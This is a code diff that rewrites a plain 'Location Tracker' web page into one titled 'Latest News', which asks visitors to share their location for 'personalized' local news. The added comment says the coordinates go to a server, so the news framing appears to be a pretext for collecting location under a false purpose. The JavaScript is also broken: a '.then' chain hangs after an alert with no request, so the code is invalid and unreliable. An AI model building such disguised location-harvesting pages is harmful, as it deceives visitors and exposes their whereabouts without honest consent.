@@ -3,51 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Tracker</title>
+    <title>Latest News</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 20px;
+            padding: 0;
+        }
+        h1 {
+            color: #333;
+        }
+        button {
+            background-color: #007BFF;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
 </head>
 <body>
-    <h1>Get Location</h1>
-    <button onclick="getLocation()">Click to Get Location</button>
+    <h1>Breaking News</h1>
+    <p>Stay informed with the latest updates in your area. Click below to get personalized news for your location.</p>
+    <button onclick="getLocation()">Get Local Updates</button>
+
     <script>
         function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocation, showError);
-            } else {
-                alert("Geolocation is not supported by this browser.");
-            }
-        }
+            if ('geolocation' in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
 
-        function sendLocation(position) {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-
-            // Send data to your server
-            console.log(`Latitude: ${latitude}, Longitude: ${longitude}`);
+                        // Send location data to the server
+                        console.log(`Latitude: ${latitude}, Longitude: ${longitude}`);
 alert(`Latitude: ${latitude}, Longitude: ${longitude}`);
 
-            .then(response => response.json())
-            .then(data => {
-                alert("Location sent successfully!");
-            })
-            .catch(error => {
-                console.error("Error:", error);
-            });
-        }
-
-        function showError(error) {
-            switch (error.code) {
-                case error.PERMISSION_DENIED:
-                    alert("User denied the request for Geolocation.");
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    alert("Location information is unavailable.");
-                    break;
-                case error.TIMEOUT:
-                    alert("The request to get user location timed out.");
-                    break;
-                case error.UNKNOWN_ERROR:
-                    alert("An unknown error occurred.");
-                    break;
+                        .then(response => response.json())
+                        .then(data => {
+                            alert("Thank you! Local news is being personalized for your area.");
+                        })
+                        .catch(error => {
+                            console.error("Error:", error);
+                            alert("An error occurred while processing your location.");
+                        });
+                    },
+                    (error) => {
+                        alert("Unable to retrieve location. Please enable location services.");
+                    }
+                );
+            } else {
+                alert("Geolocation is not supported by this browser.");
             }
         }
     </script>
